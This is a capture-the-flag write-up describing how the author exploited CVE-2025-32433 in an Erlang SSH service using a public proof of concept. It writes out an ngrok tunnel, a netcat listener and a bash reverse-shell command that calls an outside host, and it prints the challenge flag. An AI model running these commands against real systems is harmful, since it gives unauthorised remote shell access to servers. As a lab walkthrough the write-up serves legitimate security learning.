# Compromised Voting Engine - net

## Challenge 

Our online voting engine is heavily locked down, and can only be accessed via SSH by our 5 candidates and vetted officials.

However, we have detected that our system has been compromised!

Discover how the attackers have gained access and you will be rewarded.

note: please do not use brute forcing tools when attempting this challenge

## Solve

Connecting to the port the only message we receive is:

`SSH-2.0-Erlang/5.1.4`

Sending information to the service terminates, and with no other known information or routes, I began to research vulnerabilities in Erlang and found **[cve-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)** - which our version is affected by!

Using the POC found at **[this repository](https://github.com/0xPThree/cve-2025-32433)**  I ran the script to attempt to gain a reverse shell on the target machine.

However, I realised I didn't have a mechanism to faciliate port forwarding, directing the traffic from another public IP to my specific private address. This was a challenge I have run into repeatedly in CTF's as I'm used to getting shells on remote devices on the same network (i.e in THM / HTB VPN environments).

This time, I used `ngrok` to create a temporary domain to forward traffic to my listener port. The setup for the exploit is as such:

1. Set up port forwarding with `ngrok`

```bash
ngrok tcp 444
```

nrokimg

- This created the temporary domain which will receive the traffic from the vulnerable machine and forward it to my local device at port `444`

2. Set up listener 

```bash
nc -lvnp 444
```

- Opens up port `444` to listen for incoming connections

3. Run exploit script, providing reverse shell command:

```bash
bash -i >& /dev/tcp/0.tcp.au.ngrok.io/11641 0>&1
```

exploit.png

We can see that the listener catches the connection initiated by the target machine:

revshell.png

From here we can explore the filesystem and find `flag.txt` in the root directory:

`secedu{CVE-2025-32433_pr3-@uth-I3-bESt!}`

